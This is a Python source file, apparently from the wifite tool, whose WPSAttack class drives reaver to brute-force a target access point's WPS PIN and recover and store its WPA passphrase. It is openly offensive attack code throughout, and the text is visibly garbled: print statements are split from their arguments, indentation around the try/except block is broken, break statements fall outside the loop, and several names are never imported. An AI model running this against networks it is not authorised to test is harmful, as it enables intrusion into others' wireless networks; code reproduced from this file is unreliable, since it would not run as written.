from subprocess import Popen
from wifite.attack import Attack


class WPSAttack(Attack):
    def __init__(self, iface, target, config):
        self.iface = iface
        self.target = target
        self.RUN_CONFIG = config

    def run(self):
        """
            Abstract method for initializing the WPS attack
        """
        self.attack_wps()

    def end(self):
        """
            Abstract method for ending the WPS attack
        """
        pass

    def attack_wps(self):
        """
            Mounts attack against target on iface.
            Uses "reaver" to attempt to brute force the PIN.
            Once PIN is found, PSK can be recovered.
            PSK is displayed to user and added to WPS_FINDINGS
        """
        print
        GR + ' [0:00:00]' + W + ' initializing %sWPS PIN attack%s on %s' % \
                                (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W)

        cmd = ['reaver',
               '-i', self.iface,
               '-b', self.target.bssid,
               '-o', self.RUN_CONFIG.temp + 'out.out',  # Dump output to file to be monitored
               '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
               '-c', self.target.channel,
               # '--ignore-locks',
               '-vv']  # verbose output
        proc = Popen(cmd, stdout=DN, stderr=DN)

        cracked = False  # Flag for when password/pin is found
        percent = 'x.xx%'  # Percentage complete
        aps = 'x'  # Seconds per attempt
        time_started = time.time()
        last_success = time_started  # Time of last successful attempt
        last_pin = ''  # Keep track of last pin tried (to detect retries)
        retries = 0  # Number of times we have attempted this PIN
        tries_total = 0  # Number of times we have attempted all pins
        tries = 0  # Number of successful attempts
        pin = ''
        key = ''

        try:
            while not cracked:
                time.sleep(1)

                if proc.poll() != None:
                    # Process stopped: Cracked? Failed?
                    inf = open(self.RUN_CONFIG.temp + 'out.out', 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        # When it's cracked:
                        if line.find("WPS PIN: '") != -1:
                            pin = line[line.find("WPS PIN: '") + 10:-1]
                        if line.find("WPA PSK: '") != -1:
                            key = line[line.find("WPA PSK: '") + 10:-1]
                            cracked = True
                    break

                if not os.path.exists(self.RUN_CONFIG.temp + 'out.out'): continue

                inf = open(self.RUN_CONFIG.temp + 'out.out', 'r')
                lines = inf.read().split('\n')
                inf.close()

                for line in lines:
                    if line.strip() == '': continue
                    # Status
                    if line.find(' complete @ ') != -1 and len(line) > 8:
                        percent = line.split(' ')[1]
                        i = line.find(' (')
                        j = line.find(' seconds/', i)
                        if i != -1 and j != -1: aps = line[i + 2:j]
                    # PIN attempt
                    elif line.find(' Trying pin ') != -1:
                        pin = line.strip().split(' ')[-1]
                        if pin == last_pin:
                            retries += 1
                        elif tries_total == 0:
                            last_pin = pin
                            tries_total -= 1
                        else:
                            last_success = time.time()
                            tries += 1
                            last_pin = pin
                            retries = 0
                        tries_total += 1

                    # Warning
                    elif line.endswith('10 failed connections in a row'):
                        pass

                    # Check for PIN/PSK
                    elif line.find("WPS PIN: '") != -1:
                        pin = line[line.find("WPS PIN: '") + 10:-1]
                    elif line.find("WPA PSK: '") != -1:
                        key = line[line.find("WPA PSK: '") + 10:-1]
                        cracked = True
                    if cracked: break

                print(' %s WPS attack, %s success/ttl,' % \
                (GR + sec_to_hms(time.time() - time_started) + W, \
                 G + str(tries) + W + '/' + O + str(tries_total) + W))

                if percent == 'x.xx%' and aps == 'x':
                    print('\r')
                else:
                    print('%s complete (%s sec/att)   \r' % (G + percent + W, G + aps + W))

            if self.RUN_CONFIG.WPS_TIMEOUT > 0 and (time.time() - last_success) > self.RUN_CONFIG.WPS_TIMEOUT:
                print
                R + '\n [!]' + O + ' unable to complete successful try in %d seconds' % (self.RUN_CONFIG.WPS_TIMEOUT)
                print
                R + ' [+]' + W + ' skipping %s' % (O + self.target.ssid + W)
                break

            if self.RUN_CONFIG.WPS_MAX_RETRIES > 0 and retries > self.RUN_CONFIG.WPS_MAX_RETRIES:
                print
                R + '\n [!]' + O + ' unable to complete successful try in %d retries' % (
                self.RUN_CONFIG.WPS_MAX_RETRIES)
                print
                R + ' [+]' + O + ' the access point may have WPS-locking enabled, or is too far away' + W
                print
                R + ' [+]' + W + ' skipping %s' % (O + self.target.ssid + W)
                break

            if self.RUN_CONFIG.WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (
                float(tries) / tries_total) < self.RUN_CONFIG.WPS_RATIO_THRESHOLD:
                print
                R + '\n [!]' + O + ' successful/total attempts ratio was too low (< %.2f)' % (
                self.RUN_CONFIG.WPS_RATIO_THRESHOLD)
                print
                R + ' [+]' + W + ' skipping %s' % (G + self.target.ssid + W)
                break

            stdout.flush()
            # Clear out output file if bigger than 1mb
            inf = open(self.RUN_CONFIG.temp + 'out.out', 'w')
            inf.close()

        # End of big "while not cracked" loop

        if cracked:
            if pin != '': print
            GR + '\n\n [+]' + G + ' PIN found:     %s' % (C + pin + W)
            if key != '': print
            GR + ' [+] %sWPA key found:%s %s' % (G, W, C + key + W)
            self.RUN_CONFIG.WPA_FINDINGS.append(
                W + "found %s's WPA key: \"%s\", WPS PIN: %s" % (G + self.target.ssid + W, C + key + W, C + pin + W))
            self.RUN_CONFIG.WPA_FINDINGS.append('')

            t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
            t.key = key
            t.wps = pin
            self.RUN_CONFIG.save_cracked(t)

    except KeyboardInterrupt:
    print
    R + '\n (^C)' + O + ' WPS brute-force attack interrupted' + W
    if attack_interrupted_prompt():
        send_interrupt(proc)
        print
        ''
        self.RUN_CONFIG.exit_gracefully(0)


send_interrupt(proc)

return cracked
